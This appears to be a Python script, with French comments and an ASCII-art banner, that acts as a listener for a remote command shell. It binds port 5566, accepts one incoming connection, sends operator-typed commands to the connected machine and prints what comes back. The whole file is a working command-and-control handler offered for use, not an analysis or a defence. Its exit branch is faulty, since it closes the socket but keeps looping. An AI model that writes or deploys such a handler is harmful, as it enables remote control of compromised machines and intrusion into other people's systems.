#!/usr/bin/python3
print("""\n\n\n   _____   __  .__.__  .__               
  /  _  \_/  |_|__|  | |__|____    ____  
 /  /_\  \   __\  |  | |  \__  \  /    \ 
/    |    \  | |  |  |_|  |/ __ \|   |  \\
\____|__  /__| |__|____/__(____  /___|  /
        \/                     \/     \/ \n\n\n""")


import socket

#Innitialisation de l'host et du port
host, port = ("", 5566)

#Innitialisation du socket 
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Conection du serveur via l'host et le port
socket.bind((host, port))
print("Server start\n")

#Ecoute du port
socket.listen(5)
print("Listening...\n")

#Le programme s'arrete jusqu'a qu'une connection s'effectue
client, ip = socket.accept()
print("Customer with ip = ",ip," is connected\n")

while True:
    #Recuperation de la commande entrer
    command = input("//> ")
    if (command == "exit()"):
        socket.close()

    else :
        #Encode de la commande en utf-8
        command = command.encode("utf-8")

        #Envoie de la commmande au client connecter
        client.send(command)

        #Recuperation de la donnee envoyer par le client 
        stdout = client.recv(1024)
        #Decodage de la donnee en utf-8
        stdout = stdout.decode("utf-8")

        #Affichage de la donnee
        print(stdout)